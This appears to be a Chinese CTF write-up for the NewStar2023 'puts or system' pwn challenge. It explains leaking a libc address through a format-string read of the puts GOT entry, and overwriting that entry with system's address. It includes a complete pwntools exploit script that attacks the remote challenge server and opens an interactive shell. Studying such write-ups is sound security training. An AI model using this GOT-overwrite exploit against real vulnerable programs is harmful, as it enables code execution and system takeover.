---
title: 格式化字符串修改got表
tags: [ctf-pwn,fmt]
date: 2023-11-27 13:12:00
categories: [ctf-pwn]
excerpt: ...
---

### NewStar2023 puts or system

<https://buuoj.cn/match/matches/190/challenges>

通过%s泄露libc

目的是通过`b'a' * 4 + b'%?$s' + p64(puts_got)`把puts_got当成字符串的地址，打印got表项

4个a和`%?$s`加起来正好是8个字节。

在获取是第几个%s的时候，由于不能像%p那样一直%s%s%s%s.....，因为%s如果作为地址取内容失败会崩溃

所以在第一次试的时候就要用 `'a' * 8 + 'b' * 8` （8个a代表原本的4个a和%?$s，8个b代表puts的got表地址），然后再加上%p%p%p%p%p%p%p%p......

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
#p = process('./putsorsys')
p=remote("node4.buuoj.cn",27515)
elf = ELF('putsorsys')
libc = ELF('libc.so.6')

puts_got = elf.got['puts']

offset = 8
p.sendlineafter("(0/1)\n", '1')

payload = b'a' * 4 + b'%9$s' + p64(puts_got)
p.send(payload)

p.recvuntil('aaaa')
puts_addr = u64(p.recv(6).ljust(8,b"\x00"))

print(hex(puts_addr))
libc_base = puts_addr - libc.symbols['puts'] 
sys_addr = libc_base + libc.symbols['system'] 
print(hex(sys_addr))

p.sendlineafter("(0/1)\n", '1')
fmtpayload = fmtstr_payload(offset, {puts_got:sys_addr})
p.sendlineafter("What's it\n",fmtpayload)
p.sendline('0')

p.interactive()

```

